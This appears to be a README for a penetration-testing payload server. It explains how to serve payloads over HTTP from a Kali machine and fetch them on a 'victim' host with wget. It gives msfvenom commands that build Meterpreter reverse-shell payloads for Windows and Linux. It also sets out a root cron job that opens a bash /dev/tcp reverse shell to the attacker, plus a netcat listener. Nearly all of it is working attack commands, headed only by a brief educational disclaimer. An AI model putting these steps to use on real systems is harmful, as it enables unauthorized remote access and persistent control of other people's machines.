## INFO 

IMPORTANT REMARK!!! This is only for educational purposes with no malicious behaviors in mind. Please, use it carefully. 

This folder contains a simple HTTP that allow simple GET and POST request through the HTTP protocol. In order to use the script, two parameters have to be modified:

- IP address
- Port address

The commands to set up the server (running on Kali Linux) are:

- python3 http_simple_server.py

All the payloads have to be stored in the folder /files. From the victim side, the commands must be:

- wget http://192.168.1.2:55555/<PAYLOAD_NAME> (to download the payloads)
- wget --post-data "Test" http://192.168.1.2:55555/

Note that wget is by default installed on Ubuntu distributions. Once the payload is located in the victim machine (and the local privilege scalation has been successfull), perform:

- chmod +x <PAYLOAD_NAME>
- ./<PAYLOAD_NAME>

Note that different payloads have been created through the msfvenom tool:

- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=55505 -f exe > ./win_x64
- msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=55505 -f elf > ./linux_x64
- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=55505 -f elf > ./linux_x86

In order to stablish the reverse shell from the victim to the attacker virtual machine, through the listenning port 55505 in the attacker machine.

For persistence purposes, the following commands have to be written in the victim machine (as root):
- cat /etc/cron*
- echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<OUR_IP>/1234 0>&1'" > cron
- cat cron
- crontab -i cron (add cron job)
- crontab -l (is it added?)

Setting a netcat listener in the attacker machine, the connection will bee stablished after rebooting the victim machine
- nc -nvlp 1234
